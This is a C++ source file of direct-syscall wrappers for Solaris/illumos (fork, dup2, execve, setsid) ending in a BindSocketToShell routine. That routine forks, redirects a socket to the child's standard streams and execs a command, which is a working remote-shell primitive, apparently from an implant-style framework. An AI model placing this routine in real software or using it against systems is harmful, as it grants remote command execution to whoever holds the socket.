/**
 * process.cc - Solaris/illumos Process Execution Implementation
 *
 * Provides fork/exec functionality via direct syscalls.
 * Solaris uses multiplexed syscalls: SYS_forksys for fork,
 * SYS_pgrpsys for setsid, and SYS_fcntl with F_DUP2FD for dup2.
 */

#include "platform/system/process.h"
#include "platform/os/solaris/syscall.h"
#include "platform/os/solaris/system.h"

// Fork syscall wrapper
// Solaris uses SYS_forksys (142) with subcode 0 for fork
Result<SSIZE, Error> Process::Fork() noexcept
{
	SSIZE result = System::Call(SYS_FORKSYS, FORKSYS_FORK, 0);
	if (result < 0)
	{
		return Result<SSIZE, Error>::Err(Error::Posix((UINT32)(-result)), Error::Process_ForkFailed);
	}
	return Result<SSIZE, Error>::Ok(result);
}

// Dup2 syscall wrapper
// Solaris has no SYS_dup2 — use fcntl(oldfd, F_DUP2FD, newfd) instead
Result<SSIZE, Error> Process::Dup2(SSIZE oldfd, SSIZE newfd) noexcept
{
	SSIZE result = System::Call(SYS_FCNTL, (USIZE)oldfd, (USIZE)F_DUP2FD, (USIZE)newfd);
	if (result < 0)
	{
		return Result<SSIZE, Error>::Err(Error::Posix((UINT32)(-result)), Error::Process_Dup2Failed);
	}
	return Result<SSIZE, Error>::Ok(result);
}

// Execve syscall wrapper
Result<SSIZE, Error> Process::Execve(const CHAR *pathname, CHAR *const argv[], CHAR *const envp[]) noexcept
{
	SSIZE result = System::Call(SYS_EXECVE, (USIZE)pathname, (USIZE)argv, (USIZE)envp);
	if (result < 0)
	{
		return Result<SSIZE, Error>::Err(Error::Posix((UINT32)(-result)), Error::Process_ExecveFailed);
	}
	return Result<SSIZE, Error>::Ok(result);
}

// Setsid syscall wrapper
// Solaris uses SYS_pgrpsys (39) with subcode 3 for setsid
Result<SSIZE, Error> Process::Setsid() noexcept
{
	SSIZE result = System::Call(SYS_PGRPSYS, PGRPSYS_SETSID);
	if (result < 0)
	{
		return Result<SSIZE, Error>::Err(Error::Posix((UINT32)(-result)), Error::Process_SetsidFailed);
	}
	return Result<SSIZE, Error>::Ok(result);
}

// BindSocketToShell - Main function to bind a socket to a shell process
Result<SSIZE, Error> Process::BindSocketToShell(SSIZE socketFd, const CHAR *cmd) noexcept
{
	if (socketFd < 0 || cmd == nullptr)
	{
		return Result<SSIZE, Error>::Err(Error::Process_BindShellFailed);
	}

	auto forkResult = Fork();

	if (forkResult.IsErr())
	{
		// Fork failed
		return Result<SSIZE, Error>::Err(forkResult, Error::Process_BindShellFailed);
	}

	auto& pid = forkResult.Value();

	if (pid == 0)
	{
		// Child process

		// Create new session (detach from controlling terminal)
		(void)Setsid();

		// Redirect stdin/stdout/stderr to socket
		if (Dup2(socketFd, STDIN_FILENO).IsErr() ||
			Dup2(socketFd, STDOUT_FILENO).IsErr() ||
			Dup2(socketFd, STDERR_FILENO).IsErr())
		{
			System::Call(SYS_EXIT, 1);
		}

		// Close original socket fd if it's not one of the standard fds
		if (socketFd > STDERR_FILENO)
		{
			System::Call(SYS_CLOSE, (USIZE)socketFd);
		}

		// Build argv for execve
		CHAR *argv[2];
		argv[0] = const_cast<CHAR *>(cmd);
		argv[1] = nullptr;

		// Empty environment
		CHAR *envp[1];
		envp[0] = nullptr;

		// Execute the command - this should not return
		(void)Execve(cmd, argv, envp);

		// If execve returns, something went wrong - exit child
		System::Call(SYS_EXIT, 1);
	}

	// Parent process - return child PID
	return Result<SSIZE, Error>::Ok(pid);
}
